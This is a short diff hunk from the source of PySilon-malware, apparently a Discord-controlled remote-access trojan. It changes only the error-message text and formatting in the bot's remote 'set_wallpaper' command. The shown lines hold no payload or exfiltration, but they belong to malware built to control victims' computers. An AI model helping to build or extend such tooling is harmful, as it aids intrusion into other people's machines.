@@ -17,10 +17,10 @@ async def set_wallpaper(ctx, image_path=None):
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
         else:
-            embed = discord.Embed(title="📛 Error", description='`File doesn\'t exist!`', colour=discord.Colour.red())
+            embed = discord.Embed(title="📛 Error", description='```File not found.```', colour=discord.Colour.red())
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await ctx.send(embed=embed)
     else:
-        embed = discord.Embed(title="📛 Error", description='`Syntax: .wallpaper <path/to/image>`', colour=discord.Colour.red())
+        embed = discord.Embed(title="📛 Error", description='```Syntax: .wallpaper <path/to/image>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
